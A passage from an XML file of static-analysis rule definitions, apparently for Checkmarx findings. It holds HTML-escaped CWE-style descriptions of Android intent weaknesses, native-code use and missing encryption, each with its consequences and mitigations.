        });&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1591</key><name>Use_of_Native_Language</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;Low-level functionality may expose code to vulnerabilities that are mitigated in a language by design, by circumventing the language's built-in defenses.&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;In many modern languages, certain functionality is managed by the language itself. By invoking low-level functionality, the language's intrinsic defenses are bypassed, allowing potentially dangerous usage of functionality that is otherwise not allowed by the core language.&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;ul&gt;
&lt;li&gt;Do not invoke low-level functionality unless explicitly required; consider a more secure alternative that is supported by the language&lt;/li&gt;
&lt;li&gt;If required, ensure that this low-level functionality holds the same coding standards as its invoking language, and undergoes any and all security processes that the invoking language undergoes, as well as additional processes dedicated to the invoked low-level library.&lt;/li&gt;
&lt;/ul&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;CPP&lt;/h3&gt;&lt;h4&gt;Native DLL PInvoke Importation&lt;/h4&gt;&lt;pre&gt;[DllImport("external_dll.dll")]
private static extern int write_to_array(int array_length, char array[]); &lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_2701</key><name>Improper_Verification_Of_Intent_By_Broadcast_Receiver</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;div class="Weakness" id="CWEDefinition"&gt;&lt;div class="title"&gt;&lt;table width="100%" border="0" cellspacing="0" cellpadding="0"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td width="20" valign="top"&gt;&amp;nbsp;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div align="center"&gt;&lt;span style="font-weight: bold;"&gt;Improper Verification of Intent by Broadcast Receiver&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;td width="20" valign="top"&gt;&lt;div class="left noprint"&gt;																			&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/div&gt;&lt;div class="status"&gt;&lt;table width="100%" border="0" cellspacing="0" cellpadding="0"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td width="33%" align="left" nowrap="" valign="top"&gt;&lt;b&gt;Weakness ID: &lt;/b&gt;925&lt;span style="font-size: 80%; font-style: italic;"&gt; (Weakness Variant)&lt;/span&gt;&lt;/td&gt;&lt;td align="center" nowrap="" valign="top"&gt;&lt;/td&gt;&lt;td align="right" nowrap="" valign="top"&gt;&lt;b&gt;Status: &lt;/b&gt;&lt;span class="Incomplete"&gt;Incomplete&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/div&gt;&lt;div id="Description"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Description&lt;/div&gt;&lt;div class="expandblock" id="oc_925_Description" name="oc_925_Description"&gt;&lt;div class="detail"&gt;            &lt;p class="subheading"&gt;Description Summary&lt;/p&gt;&lt;div class="indent"&gt;The Android application uses a Broadcast Receiver that receives an Intent but does not properly verify that the Intent came from an authorized source, e.g. by &lt;span class="gterm" onclick="getDef('Check')"&gt;checking&lt;/span&gt; the action string. &lt;/div&gt;            &lt;p class="subheading"&gt;Extended Description&lt;/p&gt;&lt;div class="indent"&gt; &lt;p&gt;Certain types of Intents, identified by action string, can only be broadcast by the operating system itself, not by third-party applications. However, when an application declares the ability for a component to receive broadcast messages, in most cases a malicious application can send an Intent with a non-reserved action string to that receiving component. &lt;/p&gt; &lt;/div&gt;         &lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Time_of_Introduction"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Time of Introduction&lt;/div&gt;&lt;div class="expandblock" id="oc_925_Time_of_Introduction" name="oc_925_Time_of_Introduction"&gt;&lt;div class="detail"&gt;&lt;ul&gt;            &lt;li&gt;Architecture and Design&lt;/li&gt;         &lt;/ul&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Applicable_Platforms"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Applicable Platforms&lt;/div&gt;&lt;div class="expandblock" id="oc_925_Applicable_Platforms" name="oc_925_Applicable_Platforms"&gt;&lt;div class="detail"&gt;            &lt;p class="subheading"&gt;Languages&lt;/p&gt;&lt;div class="indent"&gt;               &lt;p&gt;Language-independent&lt;/p&gt;            &lt;/div&gt;            &lt;p class="subheading"&gt;Architectural Paradigms&lt;/p&gt;&lt;div class="indent"&gt;               &lt;p&gt;Mobile Application&lt;/p&gt;            &lt;/div&gt;         &lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Common_Consequences"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Common Consequences&lt;/div&gt;&lt;div class="expandblock" id="oc_925_Common_Consequences" name="oc_925_Common_Consequences"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" class="Detail" border="0" cellspacing="0" cellpadding="0"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;th nowrap="" valign="top"&gt;Scope&lt;/th&gt;&lt;th width="100%" valign="top"&gt;Effect&lt;/th&gt;&lt;/tr&gt;            &lt;tr&gt;&lt;td valign="top"&gt;&lt;div style="font-size: 90%;"&gt;Integrity&lt;/div&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;p class="smaller" style="font-weight: normal;"&gt;&lt;span class="subheading"&gt;Technical Impact:&lt;/span&gt;&lt;i&gt; Gain privileges / assume						identity&lt;/i&gt;&lt;/p&gt;&lt;div style="padding-top: 5px;"&gt;&lt;p&gt;Another application can impersonate the operating system and cause the							software to perform an unintended action.&lt;/p&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;         &lt;/tbody&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Potential_Mitigations"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Potential Mitigations&lt;/div&gt;&lt;div class="expandblock" id="oc_925_Potential_Mitigations" name="oc_925_Potential_Mitigations"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" class="Detail" border="0" cellspacing="0" cellpadding="0"&gt;            &lt;tbody&gt;&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phase:  Architecture and Design&lt;/p&gt;&lt;p&gt;Before acting on the Intent, check the Intent Action to make sure it							matches the expected System action.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;         &lt;/tbody&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Relationships"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Relationships&lt;/div&gt;&lt;div class="expandblock" id="oc_925_Relationships" name="oc_925_Relationships"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" id="Detail" border="0" cellspacing="0" cellpadding="0"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;th valign="top"&gt;Nature&lt;/th&gt;&lt;th valign="top"&gt;Type&lt;/th&gt;&lt;th valign="top"&gt;ID&lt;/th&gt;&lt;th width="100%" valign="top"&gt;Name&lt;/th&gt;&lt;th class="left" valign="middle" style="text-align: center;"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;View(s) this relationship pertains to&lt;/span&gt;&lt;/span&gt;&lt;/th&gt;&lt;/tr&gt;         &lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td align="center" class="right" nowrap="" valign="top" style="padding-top: 1px;"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Class&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;923&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;               &lt;/tbody&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Maintenance_Notes"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Maintenance Notes&lt;/div&gt;&lt;div class="expandblock" id="oc_925_Maintenance_Notes" name="oc_925_Maintenance_Notes"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" class="Detail" border="0" cellspacing="0" cellpadding="0"&gt;            &lt;tbody&gt;&lt;tr&gt;&lt;td&gt;               &lt;p&gt;This entry will be made more comprehensive in later CWE versions.&lt;/p&gt;            &lt;/td&gt;&lt;/tr&gt;         &lt;/tbody&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Content_History"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Content History&lt;/div&gt;&lt;div class="expandblock" id="oc_925_Content_History" name="oc_925_Content_History"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" class="Detail" border="0" cellspacing="0" cellpadding="0"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;th class="title" valign="top" colspan="5"&gt;Submissions&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top"&gt;Submission Date&lt;/th&gt;&lt;th nowrap="" valign="top"&gt;Submitter&lt;/th&gt;&lt;th nowrap="" valign="top"&gt;Organization&lt;/th&gt;&lt;th nowrap="" valign="top"&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td nowrap="" valign="top" style="border-bottom-color: rgb(186, 197, 227); border-bottom-width: 1px; border-bottom-style: solid;" rowspan="2"&gt;2013-06-24&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top"&gt;Internal CWE Team&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" style="font-size: 90%; border-bottom-color: rgb(186, 197, 227); border-bottom-width: 1px; border-bottom-style: solid; background-color: rgb(238, 238, 238);" colspan="3"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MAJOR</severity><tag>checkmarx-medium</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_2704</key><name>Use_Of_Implicit_Intent_For_Sensitive_Communication</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;div class="Weakness" id="CWEDefinition"&gt;&lt;div class="title"&gt;&lt;table width="100%" border="0" cellspacing="0" cellpadding="0"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td width="20" valign="top"&gt;&amp;nbsp;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div align="center"&gt;&lt;span style="font-weight: bold;"&gt;Use of Implicit Intent for Sensitive Communication&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;td width="20" valign="top"&gt;&lt;div class="left noprint"&gt;																			&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/div&gt;&lt;div class="status"&gt;&lt;table width="100%" border="0" cellspacing="0" cellpadding="0"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td width="33%" align="left" nowrap="" valign="top"&gt;&lt;b&gt;Weakness ID: &lt;/b&gt;927&lt;span style="font-size: 80%; font-style: italic;"&gt; (Weakness Variant)&lt;/span&gt;&lt;/td&gt;&lt;td align="center" nowrap="" valign="top"&gt;&lt;/td&gt;&lt;td align="right" nowrap="" valign="top"&gt;&lt;b&gt;Status: &lt;/b&gt;&lt;span class="Incomplete"&gt;Incomplete&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/div&gt;&lt;div id="Description"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Description&lt;/div&gt;&lt;div class="expandblock" id="oc_927_Description" name="oc_927_Description"&gt;&lt;div class="detail"&gt;            &lt;p class="subheading"&gt;Description Summary&lt;/p&gt;&lt;div class="indent"&gt;The Android application uses an implicit intent for transmitting sensitive data to other applications. &lt;/div&gt;            &lt;p class="subheading"&gt;Extended Description&lt;/p&gt;&lt;div class="indent"&gt; &lt;p&gt;Since an implicit intent does not specify a particular application to receive the data, any application can process the intent by using an Intent &lt;span class="gterm" onclick="getDef('Filter')"&gt;Filter&lt;/span&gt; for that intent. This can allow untrusted applications to obtain sensitive data. &lt;/p&gt; &lt;/div&gt;         &lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Time_of_Introduction"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Time of Introduction&lt;/div&gt;&lt;div class="expandblock" id="oc_927_Time_of_Introduction" name="oc_927_Time_of_Introduction"&gt;&lt;div class="detail"&gt;&lt;ul&gt;            &lt;li&gt;Architecture and Design&lt;/li&gt;         &lt;/ul&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Applicable_Platforms"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Applicable Platforms&lt;/div&gt;&lt;div class="expandblock" id="oc_927_Applicable_Platforms" name="oc_927_Applicable_Platforms"&gt;&lt;div class="detail"&gt;            &lt;p class="subheading"&gt;Languages&lt;/p&gt;&lt;div class="indent"&gt;               &lt;p&gt;Language-independent&lt;/p&gt;            &lt;/div&gt;            &lt;p class="subheading"&gt;Architectural Paradigms&lt;/p&gt;&lt;div class="indent"&gt;               &lt;p&gt;Mobile Application&lt;/p&gt;            &lt;/div&gt;         &lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Common_Consequences"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Common Consequences&lt;/div&gt;&lt;div class="expandblock" id="oc_927_Common_Consequences" name="oc_927_Common_Consequences"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" class="Detail" border="0" cellspacing="0" cellpadding="0"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;th nowrap="" valign="top"&gt;Scope&lt;/th&gt;&lt;th width="100%" valign="top"&gt;Effect&lt;/th&gt;&lt;/tr&gt;            &lt;tr&gt;&lt;td valign="top"&gt;&lt;div style="font-size: 90%;"&gt;Confidentiality&lt;/div&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;p class="smaller" style="font-weight: normal;"&gt;&lt;span class="subheading"&gt;Technical Impact:&lt;/span&gt;&lt;i&gt; Read application						data&lt;/i&gt;&lt;/p&gt;&lt;div style="padding-top: 5px;"&gt;&lt;p&gt;Other applications, possibly untrusted, can read the data that is							offered through the Intent.&lt;/p&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;            &lt;tr&gt;&lt;td valign="top"&gt;&lt;div style="font-size: 90%;"&gt;Integrity&lt;/div&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;p class="smaller" style="font-weight: normal;"&gt;&lt;span class="subheading"&gt;Technical Impact:&lt;/span&gt;&lt;i&gt; Varies by context&lt;/i&gt;&lt;/p&gt;&lt;div style="padding-top: 5px;"&gt;&lt;p&gt;The application may handle responses from untrusted applications on							the device, which could cause it to perform unexpected or unauthorized							actions.&lt;/p&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;         &lt;/tbody&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Potential_Mitigations"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Potential Mitigations&lt;/div&gt;&lt;div class="expandblock" id="oc_927_Potential_Mitigations" name="oc_927_Potential_Mitigations"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" class="Detail" border="0" cellspacing="0" cellpadding="0"&gt;            &lt;tbody&gt;&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phase:  Implementation&lt;/p&gt;&lt;p&gt;If the application only requires communication with its own							components, then the destination is always known, and an explicit intent							could be used.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;         &lt;/tbody&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Relationships"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Relationships&lt;/div&gt;&lt;div class="expandblock" id="oc_927_Relationships" name="oc_927_Relationships"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" id="Detail" border="0" cellspacing="0" cellpadding="0"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;th valign="top"&gt;Nature&lt;/th&gt;&lt;th valign="top"&gt;Type&lt;/th&gt;&lt;th valign="top"&gt;ID&lt;/th&gt;&lt;th width="100%" valign="top"&gt;Name&lt;/th&gt;&lt;th class="left" valign="middle" style="text-align: center;"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;View(s) this relationship pertains to&lt;/span&gt;&lt;/span&gt;&lt;/th&gt;&lt;/tr&gt;         &lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td align="center" class="right" nowrap="" valign="top" style="padding-top: 1px;"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Class&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;285&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td align="center" class="right" nowrap="" valign="top" style="padding-top: 1px;"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Class&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;668&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts&lt;/span&gt;1000&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;               &lt;/tbody&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="References"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;References&lt;/div&gt;&lt;div class="expandblock" id="oc_927_References" name="oc_927_References"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" class="Detail" border="0" cellspacing="0" cellpadding="0"&gt;            &lt;tbody&gt;&lt;tr&gt;&lt;td valign="top"&gt;&lt;div&gt;&lt;div&gt;Erika Chin, Adrienne Porter Felt, Kate Greenwood							and David Wagner. "Analyzing Inter-Application Communication in						Android". &amp;lt;&lt;a href="http://www.cs.berkeley.edu/~afelt/intentsecurity-mobisys.pdf" target="_blank"&gt;http://www.cs.berkeley.edu/~afelt/intentsecurity-mobisys.pdf&lt;/a&gt;&amp;gt;.&lt;/div&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;            &lt;tr&gt;&lt;td valign="top"&gt;&lt;div&gt;&lt;div&gt;Android Open Source Project. "Security Tips". 2013-07-16. &amp;lt;&lt;a href="http://developer.android.com/training/articles/security-tips.html#ContentProviders" target="_blank"&gt;http://developer.android.com/training/articles/security-tips.html#ContentProviders&lt;/a&gt;&amp;gt;.&lt;/div&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;         &lt;/tbody&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Maintenance_Notes"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Maintenance Notes&lt;/div&gt;&lt;div class="expandblock" id="oc_927_Maintenance_Notes" name="oc_927_Maintenance_Notes"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" class="Detail" border="0" cellspacing="0" cellpadding="0"&gt;            &lt;tbody&gt;&lt;tr&gt;&lt;td&gt;               &lt;p&gt;This entry will be made more comprehensive in later CWE versions.&lt;/p&gt;            &lt;/td&gt;&lt;/tr&gt;         &lt;/tbody&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Content_History"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Content History&lt;/div&gt;&lt;div class="expandblock" id="oc_927_Content_History" name="oc_927_Content_History"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" class="Detail" border="0" cellspacing="0" cellpadding="0"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;th class="title" valign="top" colspan="5"&gt;Submissions&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top"&gt;Submission Date&lt;/th&gt;&lt;th nowrap="" valign="top"&gt;Submitter&lt;/th&gt;&lt;th nowrap="" valign="top"&gt;Organization&lt;/th&gt;&lt;th nowrap="" valign="top"&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td nowrap="" valign="top" style="border-bottom-color: rgb(186, 197, 227); border-bottom-width: 1px; border-bottom-style: solid;" rowspan="2"&gt;2013-07-09&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top"&gt;Internal CWE Team&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" style="font-size: 90%; border-bottom-color: rgb(186, 197, 227); border-bottom-width: 1px; border-bottom-style: solid; background-color: rgb(238, 238, 238);" colspan="3"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MAJOR</severity><tag>checkmarx-medium</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_2703</key><name>Passing_Non_Encrypted_Data_Between_Activities</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;
	&lt;link href="main.css" rel="stylesheet" type="text/css"&gt;
&lt;div id="CWEDefinition"&gt;&lt;div class="title"&gt;&lt;table cellpadding="0" cellspacing="0" border="0" width="100%"&gt;&lt;tr&gt;&lt;td valign="top" width="20px"&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div align="center"&gt;&lt;span style="font-weight:bold;color:white;"&gt;Missing Encryption of Sensitive Data&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;td valign="top" width="20px"&gt;&lt;div class="left noprint"&gt;

&lt;span class="tool"&gt;&lt;/span&gt;

&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div class="status"&gt;&lt;table width="100%" border="0" cellpadding="0" cellspacing="0"&gt;&lt;tr&gt;&lt;td valign="top" align="left" width="33%" nowrap=""&gt;&lt;b&gt;Weakness ID: &lt;/b&gt;311&lt;span style="font-style:italic; font-size:80%"&gt; (Weakness Base)&lt;/span&gt;&lt;/td&gt;&lt;td valign="top" align="center" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top" align="right" nowrap=""&gt;&lt;b&gt;Status: &lt;/b&gt;&lt;span class="Draft"&gt;Draft&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div id="Description"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Description&lt;/div&gt;&lt;div name="oc_311_Description" id="oc_311_Description" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Description Summary&lt;/p&gt;&lt;div class="indent"&gt;The software does not encrypt sensitive or critical information
before storage or transmission.&lt;/div&gt;
&lt;p class="subheading"&gt;Extended Description&lt;/p&gt;&lt;div class="indent"&gt;
&lt;p&gt; The lack of proper data encryption passes up the guarantees of
confidentiality, integrity, and accountability that properly implemented
encryption conveys.&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Time of Introduction"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Time of Introduction&lt;/div&gt;&lt;div name="oc_311_Time of Introduction" id="oc_311_Time of Introduction" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;ul&gt;
&lt;li&gt;Architecture and Design&lt;/li&gt;
&lt;li&gt;Operation&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Applicable Platforms"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Applicable Platforms&lt;/div&gt;&lt;div name="oc_311_Applicable Platforms" id="oc_311_Applicable Platforms" class="expandblock"&gt;&lt;div class="detail"&gt;

&lt;p class="subheading"&gt;Languages&lt;/p&gt;&lt;div class="indent"&gt;
&lt;p&gt;Language-independent&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Common Consequences"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Common Consequences&lt;/div&gt;&lt;div name="oc_311_Common Consequences" id="oc_311_Common Consequences" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Scope&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Effect&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;div style="font-size:90%;"&gt;Confidentiality&lt;/div&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;p&gt;If the application does not use a secure channel, such as SSL, to
exchange sensitive information, it is possible for an attacker with
access to the network traffic to sniff packets from the connection and
uncover the data. This attack is not technically difficult, but does
require physical access to some portion of the network over which the
sensitive data travels. This access is usually somewhere near where the

user is connected to the network (such as a colleague on the company
network) but can be anywhere along the path from the user to the end
server.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;div style="font-size:90%;"&gt;Confidentiality&lt;/div&gt;&lt;div style="font-size:90%;"&gt;Integrity&lt;/div&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;p&gt;Omitting the use of encryption in any program which transfers data
over a network of any kind should be considered on par with delivering
the data sent to each user on the local networks of both the sender and
receiver. Worse, this omission allows for the injection of data into a
stream of communication between two parties -- with no means for the
victims to separate valid data from invalid. In this day of widespread
network attacks and password collection sniffers, it is an unnecessary
risk to omit encryption from the design of any system which might
benefit from it.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Likelihood of Exploit"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Likelihood of Exploit&lt;/div&gt;&lt;div name="oc_311_Likelihood of Exploit" id="oc_311_Likelihood of Exploit" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;p class="indent"&gt;High to Very High&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Detection Methods"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Detection Methods&lt;/div&gt;&lt;div name="oc_311_Detection Methods" id="oc_311_Detection Methods" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
